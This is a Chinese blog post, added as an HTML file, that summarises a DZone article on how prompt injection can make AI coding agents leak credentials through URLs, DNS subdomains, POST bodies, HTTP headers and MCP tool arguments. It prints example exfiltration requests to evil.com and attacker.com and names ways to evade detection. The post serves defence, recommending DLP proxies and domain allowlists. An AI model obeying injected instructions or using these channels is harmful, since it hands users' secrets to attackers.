@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <title>你的AI代理正在偷你的密钥——四种你没想到的泄露通道 - 暗无天日</title>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5">
+  <meta name="author" content="lujun9972" />
+  <meta name="keywords" content="无主之地, AI安全, 提示注入, 密钥泄露, DLP" />
+  <meta name="theme-color" content="#FAFAF7">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=Source+Sans+3:ital,wght@0,400;0,500;0,600;1,400&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../../../media/css/org-src-fontify.css" type="text/css">
+  <link rel="stylesheet" href="../../../../../media/css/kdComment.css" type="text/css">
+  <link rel="stylesheet" href="../../../../../media/css/main.css" type="text/css">
+  <script async type="text/javascript"
+          src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+</head>
+
+  <body class="container">
+<header class="masthead">
+  <h1 class="masthead-title"><a href="../../../../../">暗无天日</a></h1>
+  <p>=============&gt;DarkSun的个人博客</p>
+  <nav class="site-nav">
+    <ul class="trigger">
+            <li><a href="../../../../../years/">Years</a></li>
+            <li><a href="../../../../../tags/">Tags</a></li>
+            <li><a href="../../../../../about/">About</a></li>
+            <li><a href="https://github.com/lujun9972/lujun9972.github.com">Github</a></li>
+            <li><a href="../../../../../rss.xml">RSS</a></li>
+    </ul>
+  </nav>
+  <form method="get" id="searchform" action="http://www.google.com/search">
+      <input type="text" class="field" name="q" id="s" placeholder="Search...">
+      <input type="hidden" name="as_sitesearch" value="lujun9972.github.io">
+  </form>
+</header>
+
+<div>
+<article class="post">
+<h1 class="title">你的AI代理正在偷你的密钥——四种你没想到的泄露通道</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>&#30446;&#24405;</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgfdca9f0">一个不该被忽视的事实</a></li>
+<li><a href="#org79a5e33">四条通道</a>
+<ul>
+<li><a href="#org5f0b881">通道一：URL 明文</a></li>
+<li><a href="#org01c79b7">通道二：DNS 查询</a></li>
+<li><a href="#orgd1e24ad">通道三：POST 请求体</a></li>
+<li><a href="#orgc293222">通道四：HTTP 头部</a></li>
+</ul>
+</li>
+<li><a href="#org7d942eb">MCP：第五条通道</a></li>
+<li><a href="#org9d974ed">工具现状</a></li>
+<li><a href="#org5d64daa">仍未解决的问题</a></li>
+<li><a href="#org1d761cd">你现在能做的</a></li>
+</ul>
+</div>
+</div>
+<p>
+原文：<a href="https://dzone.com/articles/4-ways-your-ai-coding-agent-exfiltrates-secrets">4 Ways Your AI Coding Agent Exfiltrates Secrets</a>
+</p>
+
+<div id="outline-container-orgfdca9f0" class="outline-2">
+<h2 id="orgfdca9f0">一个不该被忽视的事实</h2>
+<div class="outline-text-2" id="text-orgfdca9f0">
+<p>
+你每天用的 AI 编码代理——Claude Code、Cursor、Windsurf——能读取你的环境变量、配置文件和源代码。同时，它们还在不停地发 HTTP 请求：安装依赖、调用 API、拉取文档。你的代理 <b>既有你的钥匙，又有通向外面的门</b> 。
+</p>
+
+<p>
+一个藏在依赖包、工具响应甚至 Markdown 文件里的提示注入，就能让代理把你的凭据夹在下一个出站请求里发出去。代理不知道有什么不对，因为那条指令看起来就是一个普通任务。
+</p>
+
+<p>
+Josh Waldrep 在 DZone 上分析了这个问题，指出了四种不同的泄露通道。然而大多数安全工具只能发现第一种。
+</p>
+</div>
+</div>
+
+<div id="outline-container-org79a5e33" class="outline-2">
+<h2 id="org79a5e33">四条通道</h2>
+<div class="outline-text-2" id="text-org79a5e33">
+</div>
+<div id="outline-container-org5f0b881" class="outline-3">
+<h3 id="org5f0b881">通道一：URL 明文</h3>
+<div class="outline-text-3" id="text-org5f0b881">
+<p>
+最简单粗暴的方式。注入指令让代理请求一个带密钥的 URL：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-http">GET https://evil.com/collect?key=AKIAIOSFODNN7EXAMPLE
+</pre>
+</div>
+
+<p>
+密钥直接出现在查询字符串或路径里。任何检查 URL 的网络代理都能用正则匹配到已知的密钥格式（AWS key、GitHub token、API key）。
+</p>
+
+<p>
+<b>防御</b> ：在正向代理上做 URL 级别的 DLP（Data Loss Prevention）扫描。这是目前 <b>覆盖最广的一层</b> ，大多数代理安全工具都在做这个。
+</p>
+
+<p>
+<b>局限</b> ：只抓得到 URL 里出现的密钥。知道有 URL 扫描的攻击者，会直接换下面三条路走。
+</p>
+</div>
+</div>
+
+<div id="outline-container-org01c79b7" class="outline-3">
+<h3 id="org01c79b7">通道二：DNS 查询</h3>
+<div class="outline-text-3" id="text-org01c79b7">
+<p>
+这一条很隐蔽。注入指令让代理请求 <code>https://sk-ant-XXXXX.attacker.com/ping</code> 。HTTP 请求还没开始，代理的 HTTP 客户端先要解析主机名。这个 DNS 查询会打到攻击者的域名服务器：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-dns">sk-ant-api03-XXXXX.attacker.com. <span class="org-dns-mode-class">IN</span> <span class="org-dns-mode-type">A</span>
+</pre>
+</div>
+
+<p>
+攻击者在查询日志里看到完整的子域名，密钥就到手了。没有请求体，没有查询参数，没有任何 HTTP 流量。 <b>一个 DNS 查询就够了</b> 。
+</p>
+
+<p>
+<b>防御</b> ：DLP 扫描必须在 DNS 解析 <b>之前</b> 运行。如果代理先解析主机名再应用安全规则（大多数正是这么做的），密钥已经泄露了。扫描顺序至关重要：先模式匹配，再解析。
+</p>
+
+<p>
+<b>局限</b> ：大多数代理工具在应用安全规则之前就已经完成了 DNS 解析。DNS-over-HTTPS 让拦截更难。
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgd1e24ad" class="outline-3">
+<h3 id="orgd1e24ad">通道三：POST 请求体</h3>
+<div class="outline-text-3" id="text-orgd1e24ad">
+<p>
+代理用你的凭据作为参数调用一个 API：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-http">POST https://api.legitimate-service.com/v1/notes
+Content-Type: application/json
+
+{"title": "config", "body": "AKIAIOSFODNN7EXAMPLE"}
+</pre>
+</div>
+
+<p>
+URL 干干净净，主机名甚至可能在白名单上。所有 URL 级别的扫描器看到的都是一个正常 API 调用。密钥藏在请求体里，URL 扫描根本碰不到。
+</p>
+
+<p>
+代理时时刻刻都在发 POST 请求，这跟正常行为完全无法区分。
+</p>
+
+<p>
+<b>防御</b> ：请求体 DLP 扫描。代理缓冲请求体，从 JSON、表单字段、multipart 中提取文本，对提取出的内容跑密钥模式匹配。解析失败就阻断（fail-closed）。
+</p>
+
+<p>
+<b>局限</b> ：HTTPS 流量走正向代理时用的是 CONNECT 隧道，内容是加密的。代理只看得到主机名，看不到请求体。要完整扫描请求体，要么做 TLS 拦截（MITM，需要受信 CA 证书），要么把请求路由到代理替你发起请求的端点。
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgc293222" class="outline-3">
+<h3 id="orgc293222">通道四：HTTP 头部</h3>
+<div class="outline-text-3" id="text-orgc293222">
+<p>
+代理设置一个带凭据的自定义头部：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-http">GET https://api.example.com/data
+Authorization: Bearer sk-ant-api03-abc123def456
+X-Debug-Token: ghp_ABCDEFghijklmnopQRSTUVWXyz0123456789
+</pre>
+</div>
+
+<p>
+这是最狡猾的通道。代理在每次 API 调用时都会设置 Authorization 头部。发给 <code>api.openai.com</code> 的 <code>Bearer</code> 头部是正常使用，发给 <code>evil.com</code> 就是泄露。而代理把你的 OpenAI key 发给其他服务，是纯 DLP 很难判定的灰色地带。
+</p>
+
+<p>
+<b>防御</b> ：头部 DLP 扫描。至少扫描已知会携带凭据的头部（Authorization、Cookie、X-Api-Key）。更激进的模式：扫描所有头部，包括头部名称（密钥可以被编码为自定义头部名称，比如 <code>X-AKIA1234</code> ）。
+</p>
+
+<p>
+<b>局限</b> ：跟请求体一样受 CONNECT 隧道限制。而且合法 API 调用本身就在头部里发凭据，白名单特定 key 对应特定目标虽然有用，但配置量大且无法自动扩展。
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org7d942eb" class="outline-2">
+<h2 id="org7d942eb">MCP：第五条通道</h2>
+<div class="outline-text-2" id="text-org7d942eb">
+<p>
+HTTP 之外还有一条路：MCP（Model Context Protocol）工具调用。代理使用 MCP 服务器时，工具参数是独立的数据通路。代理可以把你的凭据作为工具参数传过去，MCP 服务器想转发到哪里就转发到哪里。
+</p>
+
+<p>
+扫描 MCP 工具输入里的密钥需要在 MCP 服务器外包裹一层检查，架构上跟 HTTP 代理扫描完全不同，但解决的是同一个问题。
+</p>
+</div>
+</div>
+
+<div id="outline-container-org9d974ed" class="outline-2">
+<h2 id="org9d974ed">工具现状</h2>
+<div class="outline-text-2" id="text-org9d974ed">
+<p>
+AI 代理安全领域还很年轻：
+</p>
+
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">通道</th>
+<th scope="col" class="org-left">防御手段</th>
+<th scope="col" class="org-left">工具状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">URL</td>
+<td class="org-left">代理 URL 级 DLP</td>
+<td class="org-left">多数工具已覆盖</td>
+</tr>
+
+<tr>
+<td class="org-left">DNS</td>
+<td class="org-left">解析前 DLP 扫描</td>
+<td class="org-left">稀缺，需要扫描顺序意识</td>
+</tr>
+
+<tr>
+<td class="org-left">请求体</td>
+<td class="org-left">请求体 DLP</td>
+<td class="org-left">新兴，受 CONNECT 隧道限制</td>
+</tr>
+
+<tr>
+<td class="org-left">头部</td>
+<td class="org-left">头部 DLP</td>
+<td class="org-left">新兴，合法使用产生误报</td>
+</tr>
+</tbody>
+</table>
+
+<p>
+开源方面，Pipelock 覆盖了四个通道（不过请求体和头部扫描目前限于明文代理流量，TLS 拦截还在开发中）。商业方面，Protect AI、Lasso Security 等正在进入这个领域。OWASP Top 10 for LLM Applications 把这类攻击归类在"Sensitive Information Disclosure"下。
+</p>
+
+<p>
+共同模式：一个正向代理坐在代理和互联网之间，扫描出站流量中已知的密钥模式。差异在于 <b>扫描什么</b> （URL only vs URL + DNS + body + headers）和 <b>什么时候扫描</b> （DNS 解析前还是后）。
+</p>
+</div>
+</div>
+
+<div id="outline-container-org5d64daa" class="outline-2">
+<h2 id="org5d64daa">仍未解决的问题</h2>
+<div class="outline-text-2" id="text-org5d64daa">
+<p>
+即使四个 HTTP 通道全部覆盖，有些泄露技术仍然很难阻止：
+</p>
+
+<ul class="org-ul">
+<li><b>编码载荷</b> ：Base64 编码后绕过正则匹配。基于熵的检测有帮助，但合法编码数据也会触发误报</li>
+<li><b>分块泄露</b> ：每次请求发一个字符，几百次调用凑齐整个密钥。单请求扫描无法重建密钥，会话级数据预算只是部分缓解</li>
+<li><b>隐写术</b> ：把密钥编码进图片像素或音频样本中上传。二进制内容分析是完全不同的问题域</li>
+<li><b>合法目标滥用</b> ：把你的 OpenAI key 发给 <code>api.openai.com</code> 的 Authorization 头部，既是正确使用，也可能是泄露给第三方系统。上下文很重要，自动化工具搞不定上下文</li>
+</ul>
+
+<p>
+根本矛盾：AI 代理需要网络访问和凭据访问才能工作。去掉任何一个，代理就废了。安全挑战在于监控两者的交集，同时不破坏工作流。
+</p>
+</div>
+</div>
+
+<div id="outline-container-org1d761cd" class="outline-2">
+<h2 id="org1d761cd">你现在能做的</h2>
+<div class="outline-text-2" id="text-org1d761cd">
+<p>
+四条立即可行的建议：
+</p>
+
+<ol class="org-ol">
+<li><b>代理流量走代理</b> 。哪怕只有基本的 URL 扫描也比裸奔强。在代理环境中设置 <code>HTTPS_PROXY</code> 和 <code>HTTP_PROXY</code></li>
+<li><b>审计代理权限</b> 。检查哪些环境变量、配置文件和密钥对代理可见，移除它不需要的</li>
+<li><b>域名白名单</b> 。如果你的代理只需要 <code>api.anthropic.com</code> 、 <code>registry.npmjs.org</code> 和 <code>github.com</code> ，别让它跟其他任何东西通信</li>
+<li><b>关注非常规通道</b> 。只扫 URL 不够。DNS、请求体和头部是下一轮攻击的目标</li>
+</ol>
+</div>
+</div>
+
+</article>
+</div>
+
+<div>
+  <div class="post-meta">
+    <span class="post-info">2026-04-16</span>
+    <span class="post-info">2026-04-16</span>
+    <a href="../../../../../tags/无主之地">无主之地</a> : <a href="../../../../../tags/ai安全">AI安全</a> : <a href="../../../../../tags/提示注入">提示注入</a> : <a href="../../../../../tags/密钥泄露">密钥泄露</a> : <a href="../../../../../tags/dlp">DLP</a>
+    <span class="post-info">lujun9972</span>
+  </div>
+  <script src="../../../../../media/js/jquery-2.1.3.min.js"></script>
+  <script src="../../../../../media/js/md5.min.js"></script>
+  <link href="https://yiyechat.com/open-source/build/content-static/css/main.css" rel="stylesheet">
+  <script src="https://yiyechat.com/open-source/build/content-static/js/main.js"></script>
+  <section>
+      <div id="gitalk-container"></div>
+      <script type="text/javascript">
+       var gitalk = new Gitalk({
+           clientID: 'fdcb5d9da3f4acb4862c',
+           clientSecret: 'dd0a16312a206782cb7669dcec5e96874ab48170',
+           repo: 'lujun9972.github.com',
+           owner: 'lujun9972',
+           admin: ['lujun9972'],
+           id: md5(location.pathname),
+           distractionFreeMode: false
+       })
+       gitalk.render('gitalk-container')
+      </script>
+  </section>
+  <script src="../../../../../media/js/kdComment.js"></script>
+      <script>
+       var _hmt = _hmt || [];
+       (function() {
+           var hm = document.createElement("script");
+           hm.src = "https://hm.baidu.com/hm.js?7bac4fd0247f69c27887e0d4e3aee41e";
+           var s = document.getElementsByTagName("script")[0];
+           s.parentNode.insertBefore(hm, s);
+       })();
+      </script>
+  <footer class="footer">
+    <p>Generated by <a href="http://www.gnu.org/software/emacs/">Emacs</a> 29.x(<a href="http://orgmode.org">Org mode</a> 9.x)</p>
+    <p>
+      Copyright &copy; 2014 - <span id="footerYear"></span> <a href="mailto:runner &lt;at&gt; runnervm35a4x &lt;dot&gt; dbzesidl24wutf20byskfd0whb &lt;dot&gt; yx &lt;dot&gt; internal &lt;dot&gt; cloudapp &lt;dot&gt; net">lujun9972</a>
+      &middot;
+      Powered by <a href="https://github.com/emacs-china/EGO" target="_blank">EGO</a>
+      &middot;
+      Themed with <a href="https://github.com/kuangdash/emacs_love" target="_blank">emacs_love</a>
+    </p>
+    <p>
+      <a href="http://creativecommons.org/licenses/by-sa/3.0/" rel="license"><img src="https://licensebuttons.net/l/by-sa/3.0/88x31.png" style="border-width:0" alt="Creative Commons License" class="center"></a>
+    </p>
+    <script type="text/javascript">document.getElementById("footerYear").innerHTML = (new Date()).getFullYear();</script>
+  </footer>
+</div>
+
+  </body>
+</html>
